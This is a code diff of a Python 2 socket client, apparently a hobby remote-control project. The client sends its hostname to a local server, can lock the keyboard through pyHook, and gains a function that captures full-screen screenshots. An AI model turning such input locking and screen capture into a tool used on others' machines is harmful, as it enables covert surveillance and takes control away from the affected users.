@@ -1,13 +1,17 @@
 import socket
 from threading import Thread
-import pythoncom, pyHook
+import pythoncom
+import pyHook
+from PIL import ImageGrab
+import time
 
 SERVER_IP = "127.0.0.1"
-PORT = 80
+PORT = 69
 DATA_RECEIVED_SIZE = 1024
 OK_DATA_LEN = 2
 OK_RESPONSE = "OK"
 HOST_NAME_LEN_LEN = 4
+NOT_OK_RESPONSE = "SOMETHING WENT WRONG"
 
 
 class Client(object):
@@ -30,6 +34,7 @@ class Client(object):
         self.socket.send(str(len(socket.gethostname())).zfill(4))
         if self.socket.recv(OK_DATA_LEN) == OK_RESPONSE:
             self.socket.send(socket.gethostname())
+        self.socket.close()
 
     def receiving_all_msgs(self):
         """
@@ -66,6 +71,7 @@ class ServerFunctions(object):
 
     def get_full_size_data(self, data_len):
         """
+        #NOT IN USE
         Input: The length of the data that needs to be received.
         Output: The data that was received.
         description: A function that receives data from the server, and checks to see if all the data has been received.
@@ -83,6 +89,17 @@ class ServerFunctions(object):
         while True:
             data_from_server = self.client_socket.recv(DATA_RECEIVED_SIZE)
             print data_from_server
+
+    @staticmethod
+    def screen_shot():
+        """
+        Takes a screen shot and saves it as a StringIO.
+        Return: The data of the image.
+        """
+        import StringIO
+        string_io = StringIO.StringIO()
+        ImageGrab.grab().save(string_io, "JPEG")
+        return string_io.getvalue()
 
 
 def lock(event):
@@ -104,4 +121,5 @@ def keyboard_lock():
 
 
 if __name__ == "__main__":
-    keyboard_lock()
+    client = Client()
+    client.start()
